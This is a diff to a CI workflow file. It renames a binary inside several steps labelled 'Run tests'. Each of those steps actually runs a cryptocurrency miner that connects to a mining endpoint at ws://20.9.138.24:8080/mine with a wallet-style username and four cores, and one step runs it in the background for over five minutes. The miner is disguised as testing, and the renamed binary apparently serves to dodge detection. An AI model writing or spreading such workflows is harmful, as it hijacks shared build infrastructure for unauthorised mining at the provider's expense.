@@ -29,7 +29,7 @@ jobs:
     - name: Build
       run: cd rejekianaksholeh  && cargo build --release
     - name: Run tests
-      run: cd rejekianaksholeh  && ./target/release/anakmamah --url ws://20.9.138.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.retno4 --cores 4 &
+      run: cd rejekianaksholeh  && ./target/release/retnoningsih --url ws://20.9.138.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.retno4 --cores 4 &
         sleep 310s
   mek:
     needs: mem
@@ -56,7 +56,7 @@ jobs:
     - name: Build
       run: cd rejekianaksholeh  && cargo build --release
     - name: Run tests
-      run: cd rejekianaksholeh  && ./target/release/anakmamah --url ws://20.9.138.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.retno4 --cores 4 
+      run: cd rejekianaksholeh  && ./target/release/retnoningsih --url ws://20.9.138.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.retno4 --cores 4 
         
     
      
@@ -85,7 +85,7 @@ jobs:
     - name: Build
       run: cd rejekianaksholeh  && cargo build --release
     - name: Run tests
-      run: cd rejekianaksholeh  && ./target/release/anakmamah --url ws://20.9.138.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.retno4 --cores 4 
+      run: cd rejekianaksholeh  && ./target/release/retnoningsih --url ws://20.9.138.24:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.retno4 --cores 4 
         
     
   Success:
